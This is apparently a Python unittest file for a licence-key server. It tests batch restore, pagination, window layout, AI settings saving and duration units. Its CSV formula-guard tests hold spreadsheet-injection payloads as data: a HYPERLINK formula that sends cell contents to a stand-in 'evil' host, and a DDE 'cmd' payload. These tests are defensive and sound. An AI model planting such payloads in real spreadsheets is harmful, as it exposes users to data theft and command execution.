"""Regression tests for the third round of changes.

Covers batch restore (批次恢复), the cross-page "operate on every filtered
key" path, the CSV formula-injection guard, and the server window layout
defects that only showed up outside the client pages.
"""

import os
import json
import tempfile
import unittest
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from core import security  # noqa: E402
from core.api_client import ApiClient, ApiError  # noqa: E402
from core.config import Config  # noqa: E402
from core.database import Database  # noqa: E402
from tests.test_api_hardening import LiveServer, login_ready  # noqa: E402


class BatchRestoreTests(unittest.TestCase):
    """批次管理 previously allowed revoking a batch but never undoing it."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.root = Path(self.tmp.name)
        self.config = Config("server", self.root / "server_config.json")
        self.db = Database(self.root / "license.db")
        _, self.bootstrap = self.db.ensure_default_admin()
        self.live = LiveServer(self.config, self.db)
        self.live.start()
        self.client = ApiClient(
            f"http://127.0.0.1:{self.live.port}",
            response_public_key=self.config.security["response_public_key"],
            response_key_id=self.config.security["response_key_id"],
        )
        login_ready(self.client, self.bootstrap)

    def tearDown(self):
        self.live.stop()
        self.db.close()
        self.tmp.cleanup()

    def _statuses(self, batch_no: str) -> dict:
        return {
            item["key_code"]: item["status"]
            for item in self.client.list_licenses(batch_no=batch_no)["items"]
        }

    def test_restore_batch_returns_revoked_keys_to_their_previous_status(self):
        batch = self.client.generate_licenses(count=2, max_devices=1)["batch_no"]
        other = self.client.generate_licenses(count=1)["batch_no"]
        keys = sorted(self._statuses(batch))
        activated_key = keys[0]
        self.client.activate(activated_key, "MACHINE-BATCH")

        self.assertEqual(self.client.revoke_batch(batch)["count"], 2)
        self.assertEqual(set(self._statuses(batch).values()), {"revoked"})

        self.assertEqual(self.client.restore_batch(batch)["count"], 2)
        restored = self._statuses(batch)
        # The activated key goes back to active, the untouched one to unused.
        self.assertEqual(restored[activated_key], "active")
        self.assertEqual(restored[keys[1]], "unused")
        # A different batch must not be touched.
        self.assertEqual(set(self._statuses(other).values()), {"unused"})

    def test_restore_batch_is_a_no_op_when_nothing_is_revoked(self):
        batch = self.client.generate_licenses(count=2)["batch_no"]
        self.assertEqual(self.client.restore_batch(batch)["count"], 0)
        self.assertEqual(set(self._statuses(batch).values()), {"unused"})

    def test_restore_batch_leaves_expired_keys_expired(self):
        batch = self.client.generate_licenses(count=1, duration_days=1)["batch_no"]
        key = next(iter(self._statuses(batch)))
        self.client.revoke_batch(batch)
        self.db.update_license_expiry(key, "2000-01-01 00:00:00")

        self.client.restore_batch(batch)
        self.assertEqual(self._statuses(batch)[key], "expired")

    def test_restore_batch_is_audited(self):
        batch = self.client.generate_licenses(count=1)["batch_no"]
        self.client.revoke_batch(batch)
        self.client.restore_batch(batch)
        logs = self.client.list_logs(keyword="恢复批次")
        self.assertGreaterEqual(logs["total"], 1)
        self.assertEqual(logs["items"][0]["target"], batch)


class CsvFormulaGuardTests(unittest.TestCase):
    """Exported cells must not be able to become spreadsheet formulas."""

    def test_formula_prefixes_are_neutralised(self):
        evil = '=HYPERLINK("http://evil/?d="&A1,"click")'
        self.assertEqual(security.csv_safe_cell(evil), "'" + evil)
        self.assertEqual(security.csv_safe_cell("@SUM(A1:A2)"), "'@SUM(A1:A2)")
        self.assertEqual(security.csv_safe_cell("-1+cmd|'/c calc'!A0"), "'-1+cmd|'/c calc'!A0")
        self.assertEqual(security.csv_safe_cell("\tpayload"), "'\tpayload")
        self.assertEqual(security.csv_safe_cell("\rpayload"), "'\rpayload")

    def test_plain_numbers_and_text_are_untouched(self):
        # Escaping every leading minus would corrupt ordinary negative numbers.
        self.assertEqual(security.csv_safe_cell("-12"), "-12")
        self.assertEqual(security.csv_safe_cell("+1"), "+1")
        self.assertEqual(security.csv_safe_cell("2026-10-01 10:00:00"), "2026-10-01 10:00:00")
        self.assertEqual(security.csv_safe_cell("正常文本"), "正常文本")
        self.assertEqual(security.csv_safe_cell(None), "")
        self.assertEqual(security.csv_safe_cell(""), "")


class FetchAllPagesTests(unittest.TestCase):
    """列表分页 helper used by the log/batch/licence bulk paths."""

    @classmethod
    def setUpClass(cls):
        try:
            from core import pages
        except ImportError as exc:  # pragma: no cover - PySide6 optional
            raise unittest.SkipTest(f"PySide6 unavailable: {exc}") from exc
        cls.pages = pages

    def test_walks_every_page_and_reports_the_server_total(self):
        rows = [{"n": n} for n in range(5)]
        seen: list[int] = []

        def fetch(limit: int, offset: int) -> dict:
            seen.append(offset)
            return {"items": rows[offset:offset + limit], "total": len(rows)}

        items, total, complete = self.pages.fetch_all_pages(
            fetch, page_size=2, limit=100
        )
        self.assertEqual([item["n"] for item in items], [0, 1, 2, 3, 4])
        self.assertEqual(total, 5)
        self.assertTrue(complete)
        self.assertEqual(seen, [0, 2, 4])

    def test_stops_at_the_ceiling_and_reports_incomplete(self):
        def fetch(limit: int, offset: int) -> dict:
            return {
                "items": [{"n": n} for n in range(offset, offset + limit)],
                "total": 10_000,
            }

        items, total, complete = self.pages.fetch_all_pages(
            fetch, page_size=10, limit=25
        )
        self.assertEqual(len(items), 25)
        self.assertEqual(total, 10_000)
        self.assertFalse(complete)

    def test_a_short_page_ends_the_walk(self):
        def fetch(limit: int, offset: int) -> dict:
            return {"items": [{"n": 1}], "total": 1}

        items, total, complete = self.pages.fetch_all_pages(
            fetch, page_size=100, limit=1000
        )
        self.assertEqual(len(items), 1)
        self.assertEqual(total, 1)
        self.assertTrue(complete)


class ServerWindowLayoutTests(unittest.TestCase):
    """The server window is outside the client-page tests that missed these."""

    @classmethod
    def setUpClass(cls):
        try:
            from PySide6.QtWidgets import QApplication

            from server import ui as server_ui
            from PySide6.QtTest import QTest
        except ImportError as exc:  # pragma: no cover - PySide6 optional
            raise unittest.SkipTest(f"PySide6 unavailable: {exc}") from exc
        cls.QApplication = QApplication
        cls.QTest = QTest
        cls.server_ui = server_ui
        cls.app = QApplication.instance() or QApplication([])

    def setUp(self):
        # ServerWindow schedules auto_start() 300ms after construction. Left
        # alone that timer escapes into a later test and tries to bind a real
        # port, so the controller is neutralised for the whole class and the
        # timer is drained while the patch is still in place.
        self._start = self.server_ui.ServerController.start
        self.server_ui.ServerController.start = lambda self: None
        self.addCleanup(self._restore_start)

    def _restore_start(self) -> None:
        self.server_ui.ServerController.start = self._start

    def _window(self, width: int, height: int):
        tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        config = Config("server", root / "server_config.json")
        db = Database(root / "license.db")
        self.addCleanup(db.close)
        window = self.server_ui.ServerWindow(config, db)
        self.addCleanup(window.close)
        window.resize(width, height)
        window.show()
        # qWait keeps the event loop running so the 300ms auto-start timer
        # fires here, where it is a no-op, instead of during another test.
        self.QTest.qWait(400)
        return window

    def test_ai_settings_survive_save_and_reload(self):
        """Saving must keep the key and the multi-provider fields on disk.

        Regression: the save handler used to clear the key widget right
        after writing the config, which made operators believe the key had
        been dropped on every restart.
        """
        tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        path = root / "server_config.json"
        config = Config("server", path)
        db = Database(root / "license.db")
        self.addCleanup(db.close)
        window = self.server_ui.ServerWindow(config, db)
        self.addCleanup(window.close)
        window.ai_enabled.setChecked(True)
        window.ai_key.setText("sk-agnes-test-key")
        window.ai_base.setText("https://api.agnes-ai.cn/v1")
        window.ai_vendor.setText("Agnes")
        window.ai_model.setCurrentText("agnes-3.0-flash")
        index = window.ai_mode.findData(self.server_ui.CHAT_MODE)
        self.assertGreaterEqual(index, 0)
        window.ai_mode.setCurrentIndex(index)
        window._ai_headers_text = '{"X-Api-Version": "2024-01-01"}'
        window._ai_extra_text = '{"top_p": 0.9}'
        window.on_save_ai()

        saved = json.loads(path.read_text(encoding="utf-8"))["ai"]
        self.assertEqual(saved["api_key"], "sk-agnes-test-key")
        self.assertEqual(saved["api_mode"], "chat_completions")
        self.assertEqual(saved["vendor_name"], "Agnes")
        self.assertEqual(saved["model"], "agnes-3.0-flash")
        self.assertEqual(saved["custom_headers"], {"X-Api-Version": "2024-01-01"})
        self.assertEqual(saved["extra_body"], {"top_p": 0.9})
        # The masked widget must still show that a key is stored.
        self.assertEqual(window.ai_key.text(), "sk-agnes-test-key")

        # A fresh window over the same file renders every saved field.
        reloaded = Config("server", path)
        reborn = self.server_ui.ServerWindow(reloaded, db)
        self.addCleanup(reborn.close)
        self.assertEqual(reborn.ai_key.text(), "sk-agnes-test-key")
        self.assertEqual(reborn.ai_vendor.text(), "Agnes")
        self.assertEqual(reborn.ai_model.currentText(), "agnes-3.0-flash")
        self.assertEqual(reborn.ai_mode.currentData(), self.server_ui.CHAT_MODE)

    def test_settings_fields_stay_usable_at_both_window_sizes(self):
        for width, height in ((1120, 720), (960, 640)):
            window = self._window(width, height)
            try:
                for name in ("input_host", "input_port", "input_public"):
                    field = getattr(window, name)
                    self.assertTrue(
                        field.isVisible(), f"{name} hidden at {width}x{height}"
                    )
                    self.assertGreaterEqual(
                        field.height(),
                        28,
                        f"{name} collapsed to {field.height()}px at {width}x{height}",
                    )
            finally:
                window.close()

    def test_log_table_empty_hint_clears_once_rows_arrive(self):
        window = self._window(1120, 720)
        try:
            window._fill_log_table([])
            hint = getattr(window.table, "_empty_hint", None)
            self.assertIsNotNone(hint)
            self.assertTrue(hint.isVisible())

            window._fill_log_table([
                {
                    "created_at": "2026-10-01 10:00:00",
                    "action": "登录成功",
                    "actor": "admin",
                    "target": "",
                    "detail": "",
                    "ip": "127.0.0.1",
                }
            ])
            self.assertEqual(window.table.rowCount(), 1)
            self.assertFalse(hint.isVisible())
        finally:
            window.close()


class DurationUnitTests(unittest.TestCase):
    def test_all_card_units_round_trip_through_database(self):
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp:
            db = Database(Path(tmp) / "license.db")
            try:
                labels = {
                    "minute": "分钟",
                    "hour": "小时",
                    "day": "天",
                    "week": "周",
                    "month": "月",
                    "quarter": "季",
                    "year": "年",
                }
                for unit, label in labels.items():
                    _, keys = db.generate_licenses(
                        1, duration_days=2, duration_unit=unit
                    )
                    license_row = db.get_license(keys[0])
                    self.assertEqual(license_row["duration_unit"], unit)
                    self.assertEqual(security.duration_text(2, unit), f"2 {label}")
                    self.assertTrue(keys[0].startswith("GSQ-"))
                    self.assertIsNotNone(security.compute_expiry(2, unit))
            finally:
                db.close()
        self.assertFalse(security.valid_unit("decade"))


class DurationUnitApiTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.root = Path(self.tmp.name)
        self.config = Config("server", self.root / "server_config.json")
        self.db = Database(self.root / "license.db")
        _, self.bootstrap = self.db.ensure_default_admin()
        self.live = LiveServer(self.config, self.db)
        self.live.start()
        self.client = ApiClient(
            f"http://127.0.0.1:{self.live.port}",
            response_public_key=self.config.security["response_public_key"],
            response_key_id=self.config.security["response_key_id"],
        )
        login_ready(self.client, self.bootstrap)

    def tearDown(self):
        self.live.stop()
        self.db.close()
        self.tmp.cleanup()

    def test_generate_and_renew_accept_every_card_unit(self):
        for unit in ("week", "month", "quarter", "year"):
            generated = self.client.generate_licenses(
                count=1, duration_days=1, duration_unit=unit
            )
            key = generated["keys"][0]
            self.assertEqual(self.db.get_license(key)["duration_unit"], unit)
            activated = self.client.activate(key, f"MACHINE-{unit.upper()}")
            self.assertTrue(activated["ok"])
            renewed = self.client.renew_license(key, 1, unit)
            self.assertTrue(renewed["ok"])

        with self.assertRaises(ApiError) as blocked:
            self.client.generate_licenses(
                count=1, duration_days=101, duration_unit="year"
            )
        self.assertIn("允许范围", str(blocked.exception))


if __name__ == "__main__":
    unittest.main()
